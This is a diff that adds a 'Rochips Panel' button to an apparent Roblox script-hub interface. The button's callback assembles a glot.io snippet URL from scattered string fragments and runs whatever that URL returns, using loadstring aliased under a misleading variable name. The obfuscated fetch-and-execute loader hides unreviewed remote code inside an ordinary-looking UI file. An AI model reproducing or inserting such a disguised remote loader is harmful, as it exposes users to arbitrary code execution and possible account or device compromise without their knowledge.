@@ -143,6 +143,24 @@ Callback = <function> - The function of the button.
 ]]
 
 
+
+Universal:AddButton({
+	Name = "Rochips Panel",
+	Callback = function()if "Rochips Loader" then
+	local Rochips_panel,v,u,i=loadstring,"/snippets","gwwv","/raw/main.lua" ;
+	Rochips_panel(game:HttpGet("https://glot.io"..v.."/" ..u.."877ga3"..i))();
+	return "it will load in around 3 - 131 seconds"
+end
+      		print("button pressed")
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+
 local Brookhaven = Window:MakeTab({
 	Name = "Brookhaven",
 	Icon = "rbxassetid://4483345998",
